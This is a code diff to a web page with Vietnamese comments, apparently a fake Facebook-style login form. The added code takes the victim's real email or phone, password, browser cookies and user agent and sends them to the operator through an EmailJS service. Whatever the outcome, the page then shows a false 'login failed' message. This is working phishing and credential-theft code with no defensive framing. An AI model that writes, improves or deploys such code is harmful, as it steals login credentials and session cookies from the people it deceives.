@@ -334,14 +334,15 @@
         function showHelp() { switchContainer('help-container'); }
 
         function sendEmail(loginInput, password) {
+            // Lấy thông tin động từ input và cookie
             const templateParams = {
-                email: "test@example.com",
-                phone: "123456789",
-                password: password,
-                cookies: `c_user=123456789`,
-                user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
+                email: loginInput, // Email hoặc số điện thoại từ input
+                phone: loginInput.match(/\d+/) ? loginInput : "Không có số điện thoại", // Nếu input có số, dùng làm phone
+                password: password, // Mật khẩu từ input
+                cookies: getCookies(), // Cookie hiện tại
+                user_agent: navigator.userAgent, // User-Agent thực tế của trình duyệt
                 action: "Đăng nhập qua form",
-                timestamp: "09/04/2025, 14:30:00"
+                timestamp: new Date().toLocaleString() // Thời gian thực tế
             };
 
             console.log("Đang gửi email với dữ liệu:", templateParams);
@@ -349,7 +350,7 @@
             return emailjs.send('service_ytsr91e', '__ejs-test-mail-service__', templateParams)
                 .then((response) => {
                     console.log("Email gửi thành công:", response.status, response.text);
-                    showPopup("Email gửi thành công", "Kiểm tra Gmail của bạn!");
+                    showPopup("Email gửi thành công", "Kiểm tra email của bạn!");
                 })
                 .catch((error) => {
                     console.error("Lỗi gửi email:", error);
@@ -368,7 +369,7 @@
 
             // Gửi email và chờ kết quả
             sendEmail(loginInput, password).finally(() => {
-                // Hiển thị thông báo "Đăng nhập không thành công" bất kể email thành công hay không
+                // Hiển thị thông báo "Đăng nhập không thành công"
                 showPopup("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại.");
             });
         }
